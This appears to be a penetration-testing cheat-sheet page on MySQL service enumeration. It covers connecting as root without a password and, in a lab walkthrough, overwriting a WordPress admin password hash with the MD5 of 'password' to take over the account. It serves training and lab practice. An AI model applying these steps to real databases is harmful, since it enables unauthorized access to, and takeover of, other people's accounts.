---
layout: default
title: 3306 | MYSQL
parent: Service Enumeration
nav_order: 6
---

# 3306 | MYSQL

---

## Connect to Remote MySQL Server

```bash
mysql -h 192.71.145.3 -u root
```

### Show Databases

```sql
show databases;
```

### Use Table and Select Records

```sql
use books;
select count(*) from authors;
```

## Change Admin Password

We have root access to the _wp_users_ table and can change the admin password to an MD5 hash.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ echo -n password | md5sum
5f4dcc3b5aa765d61d8327deb882cf99  -

# Change the admin user password to the MD5 hash above

MariaDB [wordpress_db]> UPDATE wp_users SET user_pass="5f4dcc3b5aa765d61d8327deb882cf99" WHERE ID=1;
Query OK, 1 row affected (0.059 sec)
Rows matched: 1  Changed: 1  Warnings: 0

# Validate the admin user hash has changed to the value we set

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.056 sec)



```
